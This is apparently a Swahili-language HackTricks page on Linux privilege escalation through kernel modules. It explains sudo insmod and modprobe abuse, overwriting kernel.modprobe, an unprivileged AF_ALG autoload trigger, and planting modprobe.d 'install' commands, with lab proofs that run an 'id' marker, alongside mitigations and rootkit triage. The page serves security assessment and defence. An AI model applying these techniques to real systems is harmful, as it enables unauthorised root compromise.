# Matumizi Mabaya ya Kernel Modules na modprobe

{{#include ../../banners/hacktricks-training.md}}

## Mipangilio isiyo sahihi ya kernel module na upakiaji wa modules

Usaidizi wa kernel module ni eneo lenye athari kubwa wakati wa kukagua uwezekano wa kupata upendeleo wa juu kwenye Linux. Usichukulie kila ujumbe kuhusu module isiyo na saini kuwa unawezesha exploit moja kwa moja, bali utumie ujumbe huo kujibu maswali ya kiutendaji.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Je, mtumiaji wa sasa anaweza kupakia modules kupitia `sudo`, capabilities, au njia ya helper inayoweza kuandikwa?
- Je, upakiaji wa modules bado umewezeshwa?
- Je, uthibitishaji wa saini za modules umezimwa?
- Je, directories za modules, faili za modules, au njia za mipangilio ya `modprobe.d` zinaweza kuandikwa?<sup>[[16]](#references)</sup>
- Je, kumbukumbu za kernel zinaweza kusomwa ili kuthibitisha kilichotokea?

Triage ya haraka huanza kwa ukaguzi ufuatao wa hali ya modules, saini, logging, na mti wa modules.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

Tafsiri:

- `modules_disabled=1` inamaanisha moduli haziwezi kupakiwa wala kuondolewa, na thamani haiwezi kuwekwa upya kuwa `0` hadi mfumo uwashe upya.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` kwenye mstari wa amri wa kernel au `CONFIG_MODULE_SIG_FORCE=y` huhitaji moduli zilizotiwa saini ipasavyo; la sivyo, moduli zisizotiwa saini zinaweza kupakiwa na kuweka alama ya taint kwenye kernel.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` haiweki kizuizi chochote kwa `dmesg`; ikiwa thamani ni `1`, ufikiaji unahitaji `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- Njia zinazoweza kuandikwa chini ya `/lib/modules/$(uname -r)/` ni hatari kwa sababu `modprobe` hutafuta kwenye mti huo na data yake ya utegemezi inapopakia moduli.<sup>[[8]](#references)</sup>

### Kupakia moduli na kusoma matokeo ya kernel

Ikiwa una ruhusa halali ya kupakia moduli ya ndani, `insmod` huingiza faili halisi ya `.ko` unayotoa. Kazi ya init ya moduli huendeshwa wakati wa upakiaji, na ujumbe unaoandikwa kwa `printk()` huenda kwenye bafa ya kumbukumbu ya kernel, ambayo kwa kawaida husomwa kwa `dmesg`.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Mtiririko wa msingi wa ukaguzi hutumia `modinfo` kukagua metadata, `insmod` na `rmmod` kupakia na kuondoa moduli, `lsmod` kuthibitisha hali ya upakiaji, na `dmesg` kukagua kumbukumbu za kernel.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

Ikiwa `sudo -l` inaruhusu `insmod`, `modprobe`, au wrapper inayozizunguka, lichukulie hili kuwa hatari sana: `sudo -l` huorodhesha ruhusa za mtumiaji aliyeendesha amri, na kupakia kernel module kunahitaji `CAP_SYS_MODULE`. Tazama [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) kwa njia zinazotegemea uwezo huo moja kwa moja.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### `insmod` Inayoruhusiwa na Sudo

Sheria ya sudo inayomruhusu mtumiaji kuendesha `insmod` si sawa na kuruhusu msaidizi wa kawaida wa usimamizi. Msimbo wa uanzishaji wa module huendeshwa wakati wa kuiingiza, kwa hivyo swali kuu la ukaguzi ni iwapo mtumiaji huyu anaweza kuchagua au kurekebisha module inayopakiwa.<sup>[[3]](#references)</sup>

Mtiririko ufuatao wa ukaguzi wa jumla hurudia ukaguzi wa uchunguzi, upakiaji, hali, logi na uondoaji kwa module inayochunguzwa.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

Ikiwa mtumiaji anaweza kutoa faili yoyote ya `.ko`, katika tathmini iliyoidhinishwa sheria hiyo inapaswa kuchukuliwa kuwa inamaanisha compromise kamili ya mfumo. Njia salama zaidi ya kiutendaji ni kuepuka kukabidhi upakiaji wa moduli kupitia sudo; ikiwa hilo haliwezi kuepukika, weka vizuizi kwa njia halisi, umiliki, ruhusa, sera ya kusaini, na utaratibu wa kuondoa.<sup>[[3]](#references)[[10]](#references)</sup>

Kwa muundo usio na madhara wa kujenga moduli katika maabara inayodhibitiwa, msimbo wa chanzo na Makefile ndogo zimeonyeshwa hapa chini; umbo la `make -C /lib/modules/$(uname -r)/build M=$PWD` linafuata mtiririko wa kazi wa kbuild ulioandikwa rasmi na kernel kwa moduli za nje.<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Jenga na pakia tu katika maabara iliyoidhinishwa; kbuild hujenga moduli ya nje, na amri za kupakia/kuondoa huita violesura vya kernel module.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### Ukaguzi wa matumizi mabaya ya `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` hutaja helper ya userspace ambayo kernel huendesha kwa maombi ya kupakia module kiotomatiki; sysctl hii huathiri upakiaji wa kiotomatiki, si uwekaji wa module wa moja kwa moja. Ikiwa mshambuliaji anaweza kuibadilisha iwe njia ya executable inayoweza kuandikwa na kusababisha ombi la module, helper hiyo huwa njia ya kutekeleza msimbo yenye mamlaka ya juu. Kuiweka kuwa mfuatano tupu huzima maombi ya upakiaji wa kiotomatiki; ikiwa `CONFIG_STATIC_USERMODEHELPER=y`, thamani isiyo tupu hubatilishwa na njia ya helper tuli iliyojumuishwa wakati wa ujenzi.<sup>[[1]](#references)</sup>

Kagua njia ya sasa ya helper kupitia kiolesura cha kernel sysctl na uchunguze umiliki na ruhusa za target.<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

Angalia ikiwa sysctl, sheria za sudo zilizokasimiwa, au file capabilities zinaweza kuathiriwa.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

Mchoro huu wa maabara pekee hubadilisha njia ya helper na kusababisha ombi la module-autoload lililoandikwa kwenye nyaraka; utumie tu kwenye mfumo uliotengwa na ulioidhinishwa.<sup>[[1]](#references)</sup>

Kwenye kernel za sasa za Linux, usitumie executable isiyojulikana kama kichocheo cha jumla: upakiaji wa module wa zamani kupitia binary format maalum uliondolewa kwenye Linux 6.14, huku nyaraka za kernel zikibainisha aina ya filesystem isiyojulikana kama njia ya ombi la module-autoload.<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

Kwenye mifumo iliyoimarishwa, hili linapaswa kushindwa ikiwa ruhusa zinazuia uandishi usio na priviliji kwenye `kernel.modprobe`, njia ya helper haiwezi kuandikiwa, au upakiaji otomatiki wa modules umezimwa.<sup>[[1]](#references)</sup>

### Kichochezi cha upakiaji otomatiki cha AF_ALG kisichohitaji priviliji

Kichochezi cha mfumo wa faili hapo juu hutumia `mount` yenye priviliji.<sup>[[1]](#references)</sup> Pale ambapo soketi za AF_ALG zinapatikana, mpigaji asiye na priviliji anaweza badala yake kuunganisha soketi kwenye aina ambayo haipo kimakusudi.<sup>[[17]](#references)[[18]](#references)</sup> Kisha `alg_bind()` huomba `algif-<type>` kupitia `request_module()`, ambayo huendesha helper ya module iliyosanidiwa.<sup>[[17]](#references)[[18]](#references)[[19]](#references)</sup> Hili bado hufanya kazi baada ya kuondolewa kwa upakiaji otomatiki wa legacy unknown-binary-format katika Linux 6.14.<sup>[[11]](#references)[[17]](#references)</sup> `bind()` kushindwa kunatarajiwa kwa sababu aina hiyo haipo; kagua athari ya helper badala ya thamani ya matokeo ya soketi.<sup>[[17]](#references)[[18]](#references)</sup>

Katika maabara iliyoidhinishwa, weka kwanza helper inayodhibitiwa au kanuni ya `modprobe.d`, kisha anzisha ombi moja bila `sudo` au `CAP_SYS_MODULE`.<sup>[[17]](#references)[[18]](#references)</sup> Python 3.6+ inakubali tuple ya bind ya AF_ALG `(type, name)`.<sup>[[20]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe
cat /proc/sys/crypto/af_alg_restrict 2>/dev/null
python3 - <<'PYCODE'
import socket
with socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0) as s:
    try:
        s.bind(("htprobe", "unused"))
    except OSError as exc:
        print(f"bind returned: {exc}")
PYCODE
```

Njia hii inahitaji socket ya AF_ALG inayoweza kutumika na thamani ya `kernel.modprobe` isiyo tupu.<sup>[[1]](#references)[[18]](#references)</sup> Kwenye kernels zilizo na `/proc/sys/crypto/af_alg_restrict`, thamani `2` huzima uundaji wa socket za AF_ALG; thamani `1` huzuia algorithms fulani lakini haizuii ombi la aina isiyopatikana katika `alg_bind()`.<sup>[[18]](#references)[[21]](#references)</sup> LSM inaweza kukataa ombi la moduli kabla helper haijaendeshwa.<sup>[[19]](#references)</sup>

### Usanidi wa `modprobe.d` unaoweza kuandikwa na `sudo modprobe -C`

Kabla ya kutatua moduli, `modprobe` husoma faili za `.conf` kutoka kwenye saraka za usanidi kama vile `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d`, na `/lib/modprobe.d`, kwa mpangilio wa kipaumbele. Faili yenye jina sawa kwenye saraka yenye kipaumbele cha juu hufunika faili iliyo kwenye saraka yenye kipaumbele cha chini. Muhimu zaidi, agizo la `install <module> <command>` huendesha amri yoyote ya shell **badala ya** kuingiza moduli hiyo. Kwa hiyo, njia ya usanidi inayoweza kuandikwa inaweza kusababisha utekelezaji wa amri uliocheleweshwa kwa kutumia credentials za mtumiaji wa baadaye mwenye mapendeleo atakayeendesha `modprobe`; utekelezaji wa saini za moduli za kernel hauhakikishi uhalisi wa amri hii ya userspace.<sup>[[16]](#references)</sup>

Kagua ruhusa za saraka na faili, kisha kagua usanidi unaotumika. `modprobe -n -v` ni salama kwa kukagua utatuzi kwa sababu hali ya dry-run haiingizi moduli wala kutekeleza amri ya `install`/`remove`. Pendelea `modprobe -c` badala ya tahajia ya zamani `--showconfig`, ambayo nyaraka za sasa za kmod zimeashiria itaondolewa baada ya kmod 36.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

Sheria ya sudo isiyo na vizuizi ya `modprobe` inaweza kutumiwa vibaya hata wakati faili holela za `.ko` haziwezi kupita uthibitishaji wa sahihi: `-C` huchagua saraka ya usanidi inayodhibitiwa na mshambuliaji, ambamo amri ya `install` inaweza kutekelezwa na mchakato ulioanzishwa na sudo.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

Ikiwa saraka ya `modprobe.d` inayoonekana kwa helper ya kernel inaweza kuandikwa, kichochezi kilekile cha [AF_ALG autoload trigger](#unprivileged-af_alg-autoload-trigger) kinaweza kutekeleza agizo la `install algif-htprobe` mara moja, bila kusubiri msimamizi aendeshe `modprobe`.<sup>[[16]](#references)[[18]](#references)[[19]](#references)</sup> Kwa maabara iliyoidhinishwa, weka amri isiyo na madhara ya marker ndani ya faili ya `.conf` inayoweza kuandikwa, thibitisha utatuzi kwa `modprobe -n -v algif-htprobe`, kisha endesha kichochezi kilicho hapo juu.<sup>[[8]](#references)[[16]](#references)</sup> `modules_disabled=1` na utekelezaji wa saini za module huzuia uingizaji wa module, si amri hii ya `install` ya userspace; `kernel.modprobe` iliyo tupu au njia ya AF_ALG iliyozuiwa huzuia njia hii ya autoload.<sup>[[1]](#references)[[2]](#references)[[16]](#references)[[18]](#references)[[19]](#references)</sup>

```bash
printf '%s\n' 'install algif-htprobe /bin/sh -c "id > /tmp/ht-modprobe-id"' > /etc/modprobe.d/zz-htprobe.conf
modprobe -n -v algif-htprobe
# Run the AF_ALG trigger above, then inspect /tmp/ht-modprobe-id.
```

Kwa ajili ya kupunguza hatari, usiruhusu matumizi ya `modprobe` kupitia sudo bila vizuizi vya hoja, hakikisha kila saraka ya usanidi inamilikiwa na root na hairuhusu uandishi, na kagua maagizo ya `install`/`remove` yasiyotarajiwa. Wakati mchakato unaoaminika wa usimamizi unahitaji kupuuza maagizo hayo kwa moduli moja, `modprobe --ignore-install` huyapuuza kwa moduli hiyo iliyotajwa, lakini tegemezi bado zinaweza kuwa na amri zao wenyewe.<sup>[[8]](#references)[[16]](#references)</sup>

### Ukaguzi wa `/lib/modules` zinazoweza kuandikwa

Saraka za moduli zinazoweza kuandikwa zinaweza kuruhusu kubadilishwa kwa moduli, kupandikizwa kwa moduli hasidi, au matumizi mabaya ya upakiaji-otomatiki, kutegemea jinsi `modprobe` itakavyoitwa baadaye; `modprobe` hutafuta `/lib/modules/$(uname -r)` na kutumia data yake ya utegemezi inapotafuta moduli.<sup>[[8]](#references)</sup>

Kagua faili za moduli zinazoweza kuandikwa pamoja na metadata ya utegemezi/alias chini ya mti wa moduli wa toleo la kernel linalotumika.<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

Ukipata maudhui ya module yanayoweza kuandikwa, chunguza jinsi `modprobe` inavyotatua utegemezi na jinsi `modinfo` inavyoripoti metadata ya module.<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

Maelezo ya kujilinda:

- Hakikisha `/lib/modules` inamilikiwa na `root:root` na haiwezi kuandikiwa na watumiaji.<sup>[[8]](#references)</sup>
- Weka `kernel.modules_disabled=1` baada ya kuwasha mfumo, pale inapowezekana kiutendaji.<sup>[[1]](#references)</sup>
- Tekeleza utiaji saini wa module kwenye mifumo inayohitaji module zinazoweza kupakiwa.<sup>[[2]](#references)</sup>
- Fuatilia uandikaji kwenye `/proc/sys/kernel/modprobe`, `/lib/modules`, na saraka za usanidi za `modprobe.d`, pamoja na utekelezaji usiotarajiwa wa `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## Uchunguzi wa awali wa rootkit inayotegemea module

Module hasidi inaweza kunasa syscalls, mitazamo ya VFS au `/proc`, njia za mtandao, au ukaguzi wa vitambulisho ili kuficha michakato na faili, kuelekeza upya trafiki, au kunasa siri. Inaweza pia kujiondoa kwenye orodha ya module zinazoonyeshwa na `lsmod`. Uendelevu unaweza kutokana na aliases au sheria za install za `modprobe.d`, `/etc/modules-load.d`, kitengo cha systemd, maudhui ya initramfs, au kubadilishwa kwa faili halali ya `.ko`. Matokeo ya kawaida ya `lsmod` ni ushahidi muhimu, lakini uvamizi katika kiwango cha kernel unaweza kufanya orodha zinazotolewa na kernel zisiwe za kuaminika. Linganisha module zilizopakiwa, faili zilizo kwenye diski, usanidi wa kuwasha mfumo, kumbukumbu za upakiaji wa module, na telemetria ya nje inayoaminika.

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

Kagua majina ya module, njia, dependencies, signatures na nyakati za kupakia zisizotarajiwa. Ujumbe wa kernel taint na module zisizosainiwa ni vidokezo, si uthibitisho wa rootkit. Ikiwa rootkit inashukiwa, kusanya ushahidi kutoka kwenye image au recovery environment inayoaminika kabla ya kutegemea matokeo ya kernel inayoendesha. Ukurasa wa [tathmini ya udhaifu wa kernel](kernel-vulnerability-assessment.md) unaeleza usanidi na uwezekano wa kufichua taarifa za uchunguzi, ikiwemo tracefs na vitu vya BPF vilivyobandikwa.



## References

- [1] [Nyaraka za /proc/sys/kernel/ — Nyaraka za Linux Kernel](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Kituo cha kusaini module za kernel — Nyaraka za Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Misingi ya Driver — Nyaraka za Linux Kernel](https://docs.kernel.org/driver-api/basics.html)
- [6] [Kuweka kumbukumbu ya ujumbe kwa printk — Nyaraka za Linux Kernel](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Kujenga module za nje — Nyaraka za Linux Kernel](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Unganisha tag 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
- [17] [Kufufua Mbinu ya modprobe_path: Kukwepa Kiraka cha search_binary_handler() — Theori](https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch)
- [18] [AF_ALG bind na ombi la module — Msimbo chanzo wa Linux kernel](https://github.com/torvalds/linux/blob/master/crypto/af_alg.c)
- [19] [Utekelezaji wa module helper — Msimbo chanzo wa Linux kernel](https://github.com/torvalds/linux/blob/master/kernel/module/kmod.c)
- [20] [socket — Nyaraka za Python](https://docs.python.org/3/library/socket.html)
- [21] [/proc/sys/crypto/ — Nyaraka za Linux kernel](https://docs.kernel.org/admin-guide/sysctl/crypto.html)
{{#include ../../banners/hacktricks-training.md}}
